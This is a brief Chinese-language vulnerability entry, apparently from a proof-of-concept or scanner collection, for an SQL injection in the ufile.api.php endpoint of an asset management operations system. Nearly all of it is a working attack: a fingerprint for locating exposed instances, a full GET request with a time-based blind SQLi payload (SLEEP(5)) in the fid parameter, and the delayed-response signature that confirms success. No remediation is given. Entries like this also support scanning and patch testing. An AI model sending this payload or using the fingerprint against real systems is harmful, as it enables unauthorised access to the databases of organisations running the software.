# 资产管理运营系统ufile.api.php存在SQL注入漏洞

资产管理运营系统ufile. ｜ SQL注入 ｜ —
- **指纹**：`body="media/css/uniform.default.css"`
- **请求**：`GET /api/file/ufile.api.php?act=filedel&fid=1%20AND%20(SELECT%207357%20FROM%20(SELECT(SLEEP(5)))UPCw) HTTP/1.1`
- **响应特征**：200 延时5秒